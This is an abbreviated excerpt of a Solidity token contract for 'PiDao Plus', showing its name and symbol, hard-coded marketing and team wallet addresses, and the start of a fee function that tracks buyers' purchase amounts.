...
contract PiDao is Context, IERC20, Ownable {
    ...
    string private _name = "PiDao Plus";
    string private _symbol = "PiDao Plus";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x7cA67def818A74A99FE5DaCd81aB8aD661C975C6); 
    address payable private teamWalletAddress = payable(0x687087D4cb97b226eB2E6FE9680FD1977ff75AB8); 
...
//		payable(serviceFeeReceiver_).transfer(serviceFee_);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(isMarketPair[sender]) {
		    buyList[recipient]=buyList[recipient].add(amount.mul(2));
